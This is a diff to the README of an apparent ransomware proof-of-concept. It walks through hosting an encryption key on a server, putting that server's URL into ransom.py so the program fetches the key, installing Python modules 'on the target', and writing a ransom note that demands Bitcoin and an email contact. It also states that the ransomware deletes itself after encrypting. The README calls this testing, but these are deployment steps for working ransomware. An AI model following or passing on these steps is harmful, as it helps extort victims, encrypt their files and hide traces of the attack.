@@ -7,7 +7,7 @@ ransomware POC
 * First you need to generate key then upload it on a server from which the ransomware will download it.
 * Second open the ransom.py file with text editor or with python IDLE, find this line ===>     url = ('')     <====
 and in the quotes paste your server link which points to your .key file,for example url = ('https://myserver.com/mykey.key')
-then save the file and your ransom is ready for testing!
+ in line ===>   ransom_message = '''type your message here''' <=== type the message for the ransom,for example: pay 1 BTC to this address >your btc address< and email to this email example@mail.com to get your files back,then save the file and your ransom is ready for testing!
 * ### requirements:
 * python modules: pip install glob cryptography requests(you need to install them on the target).
 * After the ransomware done with the encryption it deletes itself.
